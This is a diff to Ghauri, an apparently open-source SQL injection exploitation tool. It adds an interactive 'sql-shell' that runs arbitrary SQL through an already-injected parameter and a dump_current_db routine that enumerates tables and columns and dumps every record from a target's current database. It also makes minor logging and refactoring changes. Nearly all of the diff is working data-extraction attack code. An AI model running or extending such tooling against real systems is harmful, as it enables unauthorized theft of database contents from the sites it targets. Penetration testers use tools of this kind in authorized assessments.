@@ -30,6 +30,7 @@ from ghauri.extractor.advance import target_adv
 from ghauri.core.extract import ghauri_extractor
 from ghauri.logger.colored_logger import logger, set_level
 from ghauri.core.tests import basic_check, check_injections
+from ghauri.core.extract import ghauri_extractor as ge
 from ghauri.common.lib import (
     os,
     re,
@@ -90,6 +91,8 @@ def perform_injection(
     safe_chars=None,
     fetch_using=None,
     test_filter=None,
+    sql_shell=False,
+    fresh_queries=False,
 ):
     verbose_levels = {
         1: logging.INFO,
@@ -105,6 +108,7 @@ def perform_injection(
     conf.timesec = timesec
     conf.fetch_using = fetch_using
     conf.test_filter = test_filter
+    conf.fresh_queries = fresh_queries
     logger.start("starting")
     if not force_ssl:
         ssl._create_default_https_context = ssl._create_unverified_context
@@ -426,26 +430,70 @@ def perform_injection(
                         )
                         logger.end("ending")
                         exit(1)
-                    return GhauriResponse(
-                        url=url,
-                        data=data,
-                        vector=vector,
-                        backend=backend,
-                        parameter=parameter,
-                        headers=full_headers,
-                        base=base,
-                        injection_type=injection_type,
-                        proxy=proxy,
-                        filepaths=filepaths,
-                        is_injected=True,
-                        is_multipart=is_multipart,
-                        attack=attack,
-                        match_string=match_string,
-                        vectors=vectors,
-                        code=code if code != 200 else None,
-                        not_match_string=None,
-                        text_only=conf.text_only,
-                    )
+                    if sql_shell:
+                        logger.info(
+                            "calling MySQL shell. To quit type 'x' or 'q' and press ENTER"
+                        )
+                        while True:
+                            choice = logger.read_input("sql-shell> ")
+                            if choice:
+                                if choice.lower() in ["x", "q"]:
+                                    break
+                                logger.info(f"fetching SQL query output: '{choice}'")
+                                retval = ghauri_extractor.fetch_characters(
+                                    url=url,
+                                    data=data,
+                                    vector=vector,
+                                    parameter=parameter,
+                                    headers=full_headers,
+                                    base=base,
+                                    injection_type=injection_type,
+                                    payloads=[choice],
+                                    backend=backend,
+                                    proxy=proxy,
+                                    is_multipart=is_multipart,
+                                    timeout=timeout,
+                                    delay=delay,
+                                    timesec=timesec,
+                                    attack01=attack,
+                                    match_string=match_string,
+                                    not_match_string=None,
+                                    code=code if code != 200 else None,
+                                    text_only=conf.text_only,
+                                    dump_type=choice,
+                                )
+                                if retval.ok:
+                                    if retval.resumed:
+                                        logger.info("resumed: '%s'" % (retval.result))
+                                    else:
+                                        logger.info("retrieved: '%s'" % (retval.result))
+                                    logger.success(f"{choice}: '{retval.result}'")
+                        logger.info(
+                            f"fetched data logged to text files under: '{filepaths.filepath}'"
+                        )
+                        logger.end("ending")
+                        exit(0)
+                    else:
+                        return GhauriResponse(
+                            url=url,
+                            data=data,
+                            vector=vector,
+                            backend=backend,
+                            parameter=parameter,
+                            headers=full_headers,
+                            base=base,
+                            injection_type=injection_type,
+                            proxy=proxy,
+                            filepaths=filepaths,
+                            is_injected=True,
+                            is_multipart=is_multipart,
+                            attack=attack,
+                            match_string=match_string,
+                            vectors=vectors,
+                            code=code if code != 200 else None,
+                            not_match_string=None,
+                            text_only=conf.text_only,
+                        )
     # end of injection
     logger.critical("all tested parameters do not appear to be injectable.")
     logger.end("ending")
@@ -520,7 +568,7 @@ class Ghauri:
         self._code = code
         self._text_only = text_only
 
-    def __end(self, database="", table="", fetched=True):
+    def _end(self, database="", table="", fetched=True):
         new_line = ""
         if database and table:
             filepath = os.path.join(conf.filepaths.filepath, "dump")
@@ -557,9 +605,8 @@ class Ghauri:
             text_only=self._text_only,
         )
         fetched = response.ok
-        if fetched:
-            logger.success("")
-        self.__end(fetched=fetched)
+        # if fetched:
+        #     logger.success("")
         return response
 
     def extract_hostname(self):
@@ -584,9 +631,8 @@ class Ghauri:
             text_only=self._text_only,
         )
         fetched = response.ok
-        if fetched:
-            logger.success("")
-        self.__end(fetched=fetched)
+        # if fetched:
+        #     logger.success("")
         return response
 
     def extract_current_db(self):
@@ -611,9 +657,8 @@ class Ghauri:
             text_only=self._text_only,
         )
         fetched = response.ok
-        if fetched:
-            logger.success("")
-        self.__end(fetched=fetched)
+        # if fetched:
+        #     logger.success("")
         return response
 
     def extract_current_user(self):
@@ -638,9 +683,8 @@ class Ghauri:
             text_only=self._text_only,
         )
         fetched = response.ok
-        if fetched:
-            logger.success("")
-        self.__end(fetched=fetched)
+        # if fetched:
+        #     logger.success("")
         return response
 
     def extract_dbs(self, start=0, stop=None):
@@ -669,9 +713,8 @@ class Ghauri:
         fetched = response.ok
         if not fetched:
             response = self.extract_current_db()
-        if fetched:
-            logger.success("")
-        self.__end(fetched=fetched)
+        # if fetched:
+        #     logger.success("")
         return response
 
     def extract_tables(self, database="", start=0, stop=None, dump_requested=False):
@@ -699,13 +742,11 @@ class Ghauri:
             database=database,
         )
         fetched = response.ok
-        if fetched:
-            logger.success("")
-        else:
-            logger.error("unable to retrieve the table names for any database")
-            print("\n")
-        if not dump_requested:
-            self.__end(fetched=True)
+        # if not fetched:
+        # logger.success("")
+        # else:
+        # logger.error("unable to retrieve the table names for any database")
+        # print("\n")
         return response
 
     def extract_columns(
@@ -736,10 +777,8 @@ class Ghauri:
             table=table,
         )
         fetched = response.ok
-        if fetched:
-            logger.success("")
-        if not dump_requested:
-            self.__end(fetched=fetched)
+        # if fetched:
+        #     logger.success("")
         return response
 
     def extract_records(
@@ -779,11 +818,8 @@ class Ghauri:
         fetched = response.ok
         if fetched:
             if not dump_requested:
-                logger.success("")
-                self.__end(database=database, table=table, fetched=fetched)
-        else:
-            if not dump_requested:
-                self.__end(fetched=fetched)
+                # logger.success("")
+                self._end(database=database, table=table, fetched=False)
         return response
 
     def dump_database(self, database="", start=0, stop=None, dump_requested=False):
@@ -812,8 +848,7 @@ class Ghauri:
                         dump_requested=dump_requested,
                     )
                     if retval_dump.ok:
-                        self.__end(database=database, table=table, fetched=False)
-        self.__end(fetched=True)
+                        self._end(database=database, table=table, fetched=False)
 
     def dump_table(
         self, database="", table="", start=0, stop=None, dump_requested=False
@@ -835,5 +870,46 @@ class Ghauri:
                 dump_requested=dump_requested,
             )
             if retval_dump.ok:
-                self.__end(database=database, table=table, fetched=False)
-        self.__end(fetched=True)
+                self._end(database=database, table=table, fetched=False)
+
+    def dump_current_db(
+        self, database="", start=0, stop=None, current_db=None, dump_requested=False
+    ):
+        logger.warning(
+            "missing database parameter. Ghauri is going to use the current database to enumerate table(s) entries"
+        )
+        if not current_db:
+            retval_current_db = self.extract_current_db()
+            if retval_current_db.ok:
+                current_db = retval_current_db.result.strip()
+        if current_db:
+            retval_tables = self.extract_tables(
+                database=current_db,
+                start=start,
+                stop=stop,
+                dump_requested=dump_requested,
+            )
+            if retval_tables.ok:
+                for table in retval_tables.result:
+                    retval_columns = self.extract_columns(
+                        database=current_db,
+                        table=table,
+                        start=start,
+                        stop=stop,
+                        dump_requested=dump_requested,
+                    )
+                    if retval_columns.ok:
+                        retval_dump = self.extract_records(
+                            database=current_db,
+                            table=table,
+                            columns=",".join(list(retval_columns.result)),
+                            start=start,
+                            stop=stop,
+                            dump_requested=dump_requested,
+                        )
+                        if retval_dump.ok:
+                            self._end(database=current_db, table=table, fetched=False)
+        else:
+            logger.error(
+                "Ghauri is expecting database name to enumerate table(s) entries."
+            )
